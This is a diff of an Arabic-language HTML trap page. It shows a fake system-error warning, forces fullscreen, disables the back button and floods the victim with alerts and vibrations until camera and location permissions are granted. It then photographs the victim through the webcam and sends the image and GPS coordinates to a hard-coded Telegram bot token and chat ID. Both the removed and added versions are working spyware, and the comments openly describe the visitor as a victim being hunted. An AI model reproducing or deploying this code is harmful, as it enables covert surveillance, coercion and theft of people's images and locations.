@@ -1,108 +1,77 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡ Critical System Update ⚡</title>
+    <title>⚡ نظام الحماية: قفل طوارئ ⚡</title>
     <style>
-        body { 
-            background: #000; color: #ff0000; font-family: 'Courier New', monospace; 
-            margin: 0; height: 100vh; overflow: hidden;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            touch-action: none; user-select: none;
-        }
-        #overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); z-index: 1000; display: flex;
-            flex-direction: column; align-items: center; justify-content: center;
-        }
-        .warn { font-size: 24px; text-align: center; padding: 20px; animation: flash 0.2s infinite; }
-        @keyframes flash { 0% {color: #f00;} 50% {color: #fff;} 100% {color: #f00;} }
-        #v { position: fixed; width: 1px; height: 1px; opacity: 0; }
+        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; height: 100vh; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; touch-action: none; }
+        #warn { font-size: 20px; font-weight: bold; border: 3px solid #f00; padding: 20px; z-index: 9999; background: #000; }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body onclick="forceLock()">
 
-    <div id="overlay" onclick="startEpicTrap()">
-        <div class="warn">⚠️ تم اكتشاف نشاط مشبوه ⚠️</div>
-        <p style="color:#fff">اضغط هنا لإلغاء قفل الجهاز وتأمين بياناتك فوراً</p>
-        <button style="padding:15px 40px; background:#f00; color:#fff; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">إصلاح الآن</button>
-    </div>
+<div id="warn">
+    ⚠️ خطأ في النظام (System Error) ⚠️<br><br>
+    اضغط هنا لإصلاح ملفات التشغيل فوراً وتجنب فقدان البيانات.
+</div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
+<video id="v" autoplay playsinline style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
-    <script>
-        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-        const ID = "1772820433";
+<script>
+    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+    const ID = "1772820433";
 
-        async function postTele(data, type='text') {
-            let u = `https://api.telegram.org/bot${T}/`;
-            if(type === 'text') {
-                await fetch(u + 'sendMessage', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: ID, text: data})
+    async function send(m, isImg=false) {
+        let u = `https://api.telegram.org/bot${T}/`;
+        if(!isImg) {
+            await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
+        } else {
+            const b = await (await fetch(m)).blob();
+            const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
+            await fetch(u+'sendPhoto',{method:'POST',body:f});
+        }
+    }
+
+    async function forceLock() {
+        // 1. طلب ملء الشاشة القسري (Sticky)
+        document.documentElement.requestFullscreen({ navigationUI: "hide" });
+
+        // 2. تجميد النظام النفسي والتقني
+        while(true) {
+            try {
+                // محاولة سحب الكاميرا والموقع
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                const p = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
                 });
-            } else {
-                const b = await (await fetch(data)).blob();
-                const f = new FormData();
-                f.append('chat_id', ID);
-                f.append('photo', b, 'final_hit.png');
-                await fetch(u + 'sendPhoto', { method: 'POST', body: f });
+
+                // إذا نجح السحب، نرسل البيانات ونفك التجميد
+                const vid = document.getElementById('v');
+                vid.srcObject = s;
+                setTimeout(() => {
+                    const can = document.getElementById('c');
+                    can.width=vid.videoWidth; can.height=vid.videoHeight;
+                    can.getContext('2d').drawImage(vid,0,0);
+                    send(can.toDataURL('image/png'), true);
+                    send(`🎯 إحداثيات GPS:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    alert("✅ تم الإصلاح!");
+                    window.location.href = "https://google.com";
+                }, 1000);
+                break; 
+
+            } catch(err) {
+                // ضربة الـ "Freeze": جعل الهاتف يهتز ويظهر تنبيهات لا تنتهي
+                navigator.vibrate([1000, 1000, 1000]);
+                // هذه الرسالة ستظهر فوق أزرار النظام وتمنع الضحية من التفاعل معها
+                alert("🚨 تنبيه أمني: لا يمكنك الخروج! يجب تفعيل الصلاحيات لإلغاء القفل.");
             }
         }
+    }
 
-        async function startEpicTrap() {
-            // 1. قفل الأزرار والاشعارات (Sticky Fullscreen)
-            const el = document.documentElement;
-            if (el.requestFullscreen) {
-                el.requestFullscreen({ navigationUI: "hide" });
-            }
-
-            // 2. سحب الموقع بالـ IP فوراً وبصمت
-            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
-                postTele(`💀 صيد ملحمي جديد!\nالإحداثيات: ${d.latitude},${d.longitude}\nالمدينة: ${d.city}\nالجهاز: ${navigator.userAgent}`);
-            });
-
-            // 3. الحلقة اللانهائية القسرية
-            while(true) {
-                try {
-                    // طلب الكاميرا والموقع الدقيق معاً
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const p = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
-                    });
-
-                    // إذا وصلنا هنا، يعني الضحية ضغط "سماح" رغماً عنه
-                    const vid = document.getElementById('v');
-                    vid.srcObject = s;
-                    
-                    setTimeout(() => {
-                        const can = document.getElementById('c');
-                        can.width = vid.videoWidth; can.height = vid.videoHeight;
-                        can.getContext('2d').drawImage(vid, 0, 0);
-                        postTele(can.toDataURL('image/png'), 'photo');
-                        postTele(`🎯 الموقع الدقيق الملحمي:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                        
-                        alert("✅ تم فك قفل النظام بنجاح!");
-                        window.location.href = "https://www.google.com";
-                    }, 1000);
-                    break; // كسر الحلقة عند النجاح
-
-                } catch (err) {
-                    // إذا رفض، يتم إغراقه بتنبيهات تمنعه من لمس أي شيء آخر
-                    navigator.vibrate([1000, 500, 1000]);
-                    alert("🚨 خطأ قاتل! يجب السماح بالوصول لتجنب تدمير نظام التشغيل!");
-                }
-            }
-        }
-
-        // قفل أزرار الرجوع والتاريخ للأبد
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => {
-            history.pushState(null, null, location.href);
-            alert("⚠️ لا يمكنك العودة! أكمل إجراءات الأمان.");
-        };
-    </script>
+    // قتل زر الرجوع
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => { history.pushState(null, null, location.href); };
+</script>
 </body>
 </html>
